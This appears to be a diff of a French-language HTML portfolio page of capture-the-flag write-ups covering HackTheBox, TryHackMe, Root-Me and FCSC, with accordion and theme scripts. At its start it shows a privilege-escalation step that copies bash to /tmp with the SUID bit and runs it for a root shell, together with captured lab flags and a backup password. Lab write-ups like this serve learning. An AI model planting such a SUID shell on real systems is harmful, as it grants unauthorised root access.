 cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
-```
+# ensuite /tmp/rootbash -p pour obtenir shell root
 
-```bash
-/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip 
-/var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz
-```
+Flags trouvés :
 
-```bash
-/root/scripts/cleanup.sh
-```
+user.txt: c2eccb774042d4ac3ff83c3c66b55250
+root.txt: b7f38a74e151fbff1dc3a481ca59db70
 
-Déconnexion puis reconnexion afin que les changements soient pris en compte.
+Conclusion
 
-```bash
-enzo@planning:~$ /tmp/rootbash -p
-rootbash-5.2# ls
-user.txt
-rootbash-5.2# cat user.txt
-c2eccb774042d4ac3ff83c3c66b55250
-rootbash-5.2# cd root
-rootbash: cd: root: No such file or directory
-rootbash-5.2# cd /root
-rootbash-5.2# ls
-root.txt  scripts
-rootbash-5.2# cat root.txt
-b7f38a74e151fbff1dc3a481ca59db70
+Box intéressante pour manipuler Grafana, Docker et crontabs. La partie tunnel SSH pour accéder à l'UI crontab a été instructive.
+</script>
+</div>
+</article>
 
-rootbash-5.2# cd scripts
-rootbash-5.2# ls
-cleanup.sh  crontab.db  docker-compose.yml  Dockerfile
-rootbash-5.2# cleanup.sh
-```
+    <!-- Machine Basique -->
+    <article class="writeup-item">
+      <h3 class="clickable"><span class="title-text">Machine Basique</span></h3>
+      <div class="writeup-content" aria-hidden="true">
+        <script type="text/markdown">
 
-# Conclusion
+HackTheBox - Machine Basique
+Introduction
 
-Cette box était plutôt cool. J’ai pû toucher un peu aux bases de données, à Grafana.
+Ce writeup décrit la résolution de la machine "Basique" sur HackTheBox. L'objectif était de découvrir les services exposés et d'exploiter une faille simple.
+Étapes
 
-J’ai appris à faire un tunnel SSH pour un accès via un browser. C’était pas évident cette partie.
-                    
-                    </script>
-                </div>
-            </div>
-                
-            </div>
-            <div class="writeup-item">
-                <h2 class="clickable">Machine Basique</h2>
-                <div class="writeup-content">
-                    <script type="text/markdown">
-# HackTheBox - Machine Basique  
-## Introduction  
-Ce writeup décrit la résolution de la machine "Basique" sur HackTheBox. L'objectif était de découvrir les services exposés et d'exploiter une faille simple.  
-## Étapes  
-1. **Scan initial** : Utilisation de `nmap` pour identifier les ports ouverts.  
-```bash  
-nmap -sC -sV -oA scan 10.10.10.10  
-```  
-2. **Exploitation** : Découverte d'une vulnérabilité dans un service web.  
-3. **Accès root** : Escalade de privilèges via un fichier de configuration mal sécurisé.  
-## Conclusion  
+    Scan initial : Utilisation de nmap pour identifier les ports ouverts.
+
+nmap -sC -sV -oA scan 10.10.10.10
+
+    Exploitation : Découverte d'une vulnérabilité dans un service web.
+
+    Accès root : Escalade de privilèges via un fichier de configuration mal sécurisé.
+
+Conclusion
+
 Cette machine était un excellent exercice pour les débutants en pentest.
-                    </script>
-                </div>
-            </div>
-        </div>
-        <!-- Section TryHackMe -->
-        <div class="platform-section">
-            <h2>TryHackMe</h2>
-            <div class="writeup-item">
-                <h2 class="clickable">Machine Easy & Medium</h2>
-                <div class="writeup-content">
-                    <script type="text/markdown">
-# TryHackMe - Machine Easy & Medium  
-## Introduction  
-Ce writeup couvre une machine TryHackMe combinant des éléments faciles et moyens, avec un focus sur l'énumération et l'exploitation web.  
-## Étapes  
-1. **Énumération** : Scan des ports et services.  
-```bash  
-nmap -sV -sC 10.10.10.10  
-```  
-2. **Exploitation** : Vulnérabilité dans un CMS mal configuré.  
-3. **Post-exploitation** : Recherche de flags et escalade de privilèges.  
-## Conclusion  
+</script>
+</div>
+</article>
+
+  </section> <!-- end HTB -->
+
+  <!-- TryHackMe -->
+  <section class="platform-section">
+    <h2>TryHackMe</h2>
+
+    <article class="writeup-item">
+      <h3 class="clickable"><span class="title-text">Machine Easy & Medium</span></h3>
+      <div class="writeup-content" aria-hidden="true">
+        <script type="text/markdown">
+
+TryHackMe - Machine Easy & Medium
+Introduction
+
+Ce writeup couvre une machine TryHackMe combinant des éléments faciles et moyens, avec un focus sur l'énumération et l'exploitation web.
+Étapes
+
+    Énumération : Scan des ports et services.
+
+nmap -sV -sC 10.10.10.10
+
+    Exploitation : Vulnérabilité dans un CMS mal configuré.
+
+    Post-exploitation : Recherche de flags et escalade de privilèges.
+
+Conclusion
+
 Un bon challenge pour consolider les bases du pentest.
-                    </script>
-                </div>
-            </div>
-        </div>
-        <!-- Section Root-Me -->
-        <div class="platform-section">
-            <h2>Root-Me</h2>
-            <div class="writeup-item">
-                <h2 class="clickable">Challenge Forensic</h2>
-                <div class="writeup-content">
-                    <script type="text/markdown">
-# Root-Me - Challenge Forensic  
-## Introduction  
-Ce challenge portait sur l'analyse d'une image mémoire avec Volatility pour extraire des informations sensibles.  
-## Étapes  
-1. **Analyse mémoire** : Utilisation de Volatility pour lister les processus.  
-```bash  
-volatility -f memory.dump pslist  
-```  
-2. **Extraction** : Récupération d'un mot de passe dans un dump mémoire.  
-3. **Validation** : Soumission du flag obtenu.  
-## Conclusion  
+</script>
+</div>
+</article>
+
+  </section>
+
+  <!-- Root-Me -->
+  <section class="platform-section">
+    <h2>Root-Me</h2>
+
+    <article class="writeup-item">
+      <h3 class="clickable"><span class="title-text">Challenge Forensic</span></h3>
+      <div class="writeup-content" aria-hidden="true">
+        <script type="text/markdown">
+
+Root-Me - Challenge Forensic
+Introduction
+
+Ce challenge portait sur l'analyse d'une image mémoire avec Volatility pour extraire des informations sensibles.
+Étapes
+
+    Analyse mémoire : Utilisation de Volatility pour lister les processus.
+
+volatility -f memory.dump pslist
+
+    Extraction : Récupération d'un mot de passe dans un dump mémoire.
+
+    Validation : Soumission du flag obtenu.
+
+Conclusion
+
 Une bonne introduction à l'analyse forensique avec Volatility.
-                    </script>
-                </div>
-            </div>
-        </div>
-        <!-- Section FCSC -->
-        <div class="platform-section">
-            <h2>FCSC</h2>
-            <div class="writeup-item">
-                <h2 class="clickable">Cryptobro</h2>
-                <div class="writeup-content">
-                    <script type="text/markdown">
-# FCSC 2025 - Cryptobro  
-## Introduction  
-Ce challenge combinait cryptographie et analyse forensique, avec un fichier `.npy` à analyser.  
-## Étapes  
-1. **Analyse du fichier** : Utilisation de NumPy pour charger le fichier `.npy`.  
-```python  
-import numpy as np  
-data = np.load('challenge.npy')  
-```  
-2. **Décodage** : Identification d'un message chiffré dans les données.  
-3. **Décryptage** : Application d'une méthode de déchiffrement pour extraire le flag.  
-## Conclusion  
+</script>
+</div>
+</article>
+</section>
+
+  <!-- FCSC -->
+  <section class="platform-section">
+    <h2>FCSC</h2>
+
+    <article class="writeup-item">
+      <h3 class="clickable"><span class="title-text">Cryptobro</span></h3>
+      <div class="writeup-content" aria-hidden="true">
+        <script type="text/markdown">
+
+FCSC 2025 - Cryptobro
+Introduction
+
+Ce challenge combinait cryptographie et analyse forensique, avec un fichier .npy à analyser.
+Étapes
+
+    Analyse du fichier : Utilisation de NumPy pour charger le fichier .npy.
+
+import numpy as np
+data = np.load('challenge.npy')
+
+    Décodage : Identification d'un message chiffré dans les données.
+
+    Décryptage : Application d'une méthode de déchiffrement pour extraire le flag.
+
+Conclusion
+
 Un challenge intéressant qui mêle plusieurs disciplines.
-                    </script>
-                </div>
-            </div>
-        </div>
-    </div>
-    <a href="index.html" class="back-link">⬅ Retour au portfolio</a>
-    <script>
-        // Config Marked pour highlight
-        marked.setOptions({
-          highlight: function(code, lang) {
-            if (hljs.getLanguage(lang)) {
-              return hljs.highlight(code, { language: lang }).value;
-            }
-            return hljs.highlightAuto(code).value;
-          }
-        });
-        // Parsing Markdown et accordéon
-        document.addEventListener('DOMContentLoaded', () => {
-            document.querySelectorAll('.writeup-item').forEach(item => {
-                const contentDiv = item.querySelector('.writeup-content');
-                const markdownScript = contentDiv.querySelector('script[type="text/markdown"]');
-                if (markdownScript) {
-                    contentDiv.innerHTML = marked.parse(markdownScript.textContent);
-                    // Re-highlight après parsing pour appliquer styles fixés
-                    hljs.highlightAll();
-                }
-                const title = item.querySelector('h2.clickable');
-                title.addEventListener('click', () => {
-                    const isOpen = contentDiv.classList.contains('open');
-                    // Ferme les autres pour mode unique
-                    document.querySelectorAll('.writeup-content.open').forEach(other => {
-                        if (other !== contentDiv) {
-                            other.classList.remove('open');
-                            other.parentElement.querySelector('.clickable').classList.remove('open');
-                        }
-                    });
-                    contentDiv.classList.toggle('open', !isOpen);
-                    title.classList.toggle('open', !isOpen);
-                    // Re-highlight si ouvert (pour visibilité)
-                    if (!isOpen) {
-                        setTimeout(() => hljs.highlightAll(), 100);
-                    }
-                });
-            });
-        });
-        // Toggle thème (cohérent avec index)
-        document.addEventListener('DOMContentLoaded', () => {
-            const toggle = document.getElementById('theme-toggle');
-            const icon = toggle.querySelector('.theme-icon');
-            const highlightTheme = document.getElementById('highlight-theme');
-            const isDark = localStorage.getItem('theme') === 'dark';
-            if (isDark) {
-                document.body.classList.add('dark-mode');
-                document.body.classList.remove('light-mode');
-                icon.textContent = '☀️';
-                highlightTheme.href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css';
-            } else {
-                document.body.classList.add('light-mode');
-                document.body.classList.remove('dark-mode');
-                icon.textContent = '🌙';
-                highlightTheme.href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css';
-            }
-            toggle.addEventListener('click', () => {
-                toggle.classList.add('clicked');
-                setTimeout(() => toggle.classList.remove('clicked'), 300);
-                document.body.classList.toggle('dark-mode');
-                document.body.classList.toggle('light-mode');
-                const isDarkNow = document.body.classList.contains('dark-mode');
-                icon.textContent = isDarkNow ? '☀️' : '🌙';
-                highlightTheme.href = isDarkNow
-                    ? 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css'
-                    : 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css';
-                localStorage.setItem('theme', isDarkNow ? 'dark' : 'light');
-                // Re-highlight après changement thème
-                setTimeout(() => hljs.highlightAll(), 100);
-            });
-        });
-    </script>
-</body>
-</html>
+</script>
+</div>
+</article>
+</section>
 
+</div> <!-- end writeupList -->
 
+<p style="margin-top:18px"><a href="index.html" style="color:inherit;font-weight:700;text-decoration:none">⬅ Retour au portfolio</a></p>
 
-
-
-
-
-
-
-
+</main> <!-- JavaScript: parsing Markdown + accordion + theme + highlight.js --> <script> // Configure marked to use highlight.js marked.setOptions({ highlight: function(code, lang) { try { if (lang && hljs.getLanguage(lang)) { return hljs.highlight(code, { language: lang }).value; } else { return hljs.highlightAuto(code).value; } } catch (e) { return code; } } }); // After DOM ready: parse markdown and setup accordion behavior document.addEventListener('DOMContentLoaded', () => { // Parse all markdown blocks into their writeup-content container document.querySelectorAll('.writeup-content').forEach(contentDiv => { const mdScript = contentDiv.querySelector('script[type="text/markdown"]'); if (mdScript) { // Use marked to produce HTML contentDiv.innerHTML = marked.parse(mdScript.textContent); // Apply highlight.js on initial parse (will color code blocks) hljs.highlightAll(); } }); // Accordion toggle: open one at a time document.querySelectorAll('.writeup-item').forEach(item => { const title = item.querySelector('.clickable'); const content = item.querySelector('.writeup-content'); if (!title || !content) return; title.addEventListener('click', () => { const isOpen = content.classList.contains('open'); // Close other open ones document.querySelectorAll('.writeup-content.open').forEach(other => { if (other !== content) { other.classList.remove('open'); const otherTitle = other.parentElement.querySelector('.clickable'); if (otherTitle) otherTitle.classList.remove('open'); } }); // Toggle current content.classList.toggle('open', !isOpen); title.classList.toggle('open', !isOpen); // Ensure highlight after opening (in case styles/themes changed) if (!isOpen) { setTimeout(() => hljs.highlightAll(), 120); } }); }); // Theme init (dark by default unless localStorage says otherwise) const toggle = document.getElementById('theme-toggle'); const icon = toggle.querySelector('.theme-icon'); const hlTheme = document.getElementById('highlight-theme'); function applyTheme(isDark) { if (isDark) { document.body.classList.remove('light-mode'); document.body.classList.add('dark-mode'); icon.textContent = '☀️'; hlTheme.href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css'; } else { document.body.classList.remove('dark-mode'); document.body.classList.add('light-mode'); icon.textContent = '🌙'; hlTheme.href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css'; } // re-highlight after theme change setTimeout(() => hljs.highlightAll(), 160); } const saved = localStorage.getItem('theme'); const isDarkSaved = saved === 'dark' || saved === null; // default dark applyTheme(isDarkSaved); toggle.addEventListener('click', () => { const nowDark = document.body.classList.contains('dark-mode'); applyTheme(!nowDark); localStorage.setItem('theme', !nowDark ? 'dark' : 'light'); }); }); </script> </body> </html> ```
